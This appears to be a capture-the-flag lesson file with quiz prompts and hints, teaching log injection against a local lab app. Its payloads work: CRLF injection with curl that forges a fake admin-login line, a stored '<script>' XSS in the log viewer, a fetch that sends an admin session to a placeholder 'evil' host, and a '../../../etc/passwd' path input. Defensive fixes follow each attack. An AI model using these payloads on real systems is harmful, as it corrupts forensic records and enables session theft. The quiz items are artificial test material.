title: Log Injection: forging the logs
description: CRLF to inject fake lines, XSS that detonates in the admin's log viewer and poisoning that contaminates forensic analysis.

1.title: CRLF: injecting fake lines
1.body:
## One log line = a potential lie

The app logs your feedback like this:

```python
log_line = f'[INFO] User alice said: {msg}'   # ← unsanitized msg
```

If `msg` contains a line break, you control the start of the next
line. The browser and curl send `%0d%0a` (CR+LF) and the server
writes it as is:

```bash
curl 'http://127.0.0.1:18102/feedback?msg=hola%0d%0a[SUCCESS]%20Admin%20logged%20in'
```

The log now contains:

```
[INFO] User alice said: hola
[SUCCESS] Admin logged in            ← fake line, injected by you
```

## Why does it matter?

- **Poisoned forensics**: after a real incident, the analyst rebuilds
  the timeline from the logs. Fake lines = fake culprits and
  misleading leads.
- **Evasion**: "success" noise covers up the attacker's real activity.
- **Broken parsers**: SIEMs that index line by line index your
  content as events of their own.

Send it and claim the flag, then look at the result:

```bash
curl -s http://127.0.0.1:18102/logs
```

## The fix (one line)

```python
msg = msg.replace('\r', '').replace('\n', '')   # or better: escape \r\n
```

Serious frameworks already do this: structlog and log4j (configured with
`%replace`) provide converters that neutralize line breaks. The bug
appears when someone concatenates raw input with `print()` or an
`f-string` into the logger.

log-forging-t01-q01.prompt: Which two characters (URL-encoded as %0d%0a) mark the end of one log line and the start of another under your control?

log-forging-t01-q02.prompt: Inject a line that looks like a successful admin login ([SUCCESS] Admin logged in). Submit the LOG_FORGED achievement flag.
log-forging-t01-q02.hint: curl 'http://127.0.0.1:18102/feedback?msg=hola%0d%0a[SUCCESS]%20Admin%20logged%20in' — use single quotes so bash leaves the brackets alone

log-forging-t01-q03.prompt: Inspect /logs with curl. Who appears as the author of ALL feedback lines (the default name the app writes)?

2.title: XSS in the log viewer and log poisoning
2.body:
## The XSS that detonates in the SOC CRLF was an attack on *reading* the logs. The next step is an attack on the *reader*: the admin viewer renders every line as unescaped HTML (`
{{line}}
` with innerHTML, not textContent). The attacker doesn't need the victim to visit the vulnerable site — they need **the analyst to open the log panel**: ```bash # 1. Plant the script: curl 'http://127.0.0.1:18102/feedback?msg=' # 2. The admin reviews the day's logs in their browser: # http://127.0.0.1:18102/logs → alert(1) detonates in THEIR session ``` The flag comes back in the feedback's JSON response; open the viewer in the browser too to see the real detonation. In production, that `alert(1)` would be `fetch('//evil/'+document.admin_session)`: stored XSS in the tool you least suspect — the monitoring one. ## Log poisoning with paths The third technique targets pipelines that **process** logs as paths or file names: ```bash curl 'http://127.0.0.1:18102/feedback?msg=../../../etc/passwd' ``` If any consumer of the log uses that line as a path (log rotation, uploads, template include), the `../` sequence breaks out of the directory sandbox. Real cases: log poisoning on FTP servers whose log line ended up in a PHP `include()`, and SIEM pipelines that wrote files named after content taken from the log. ## Defense in layers 1. **Sanitize at the source**: no `\r`, no `\n`, and HTML-escape (`<` → `<`) before logging user input. 2. **Safe rendering**: the viewer uses `textContent`, never `innerHTML`. 3. **Restrictive CSP** on the admin panel: `Content-Security-Policy: default-src 'self'` — even if the tag gets injected, the browser does not run the inline script. 4. **Separation**: the log viewer on a different domain/cookies than the admin panel, so an XSS there is not the key to everything.

log-forging-t02-q01.prompt: Inject a <script> via feedback and open it in the /logs viewer in your browser. Submit the XSS_IN_LOG achievement flag.
log-forging-t02-q01.hint: curl 'http://127.0.0.1:18102/feedback?msg=<script>alert(1)</script>' and then open http://127.0.0.1:18102/logs — the flag also appears in the JSON response

log-forging-t02-q02.prompt: Inject a path with ../ pointing at /etc/ to simulate parser poisoning. Submit the LOG_POISONING achievement flag.

log-forging-t02-q03.prompt: Which HTTP header (its acronym), with a restrictive policy, would stop the injected script from executing in the viewer? (the policy that blocks inline scripts)
log-forging-t02-q03.hint: A restrictive CSP with default-src 'self' and no 'unsafe-inline' stops the XSS even if the HTML gets injected
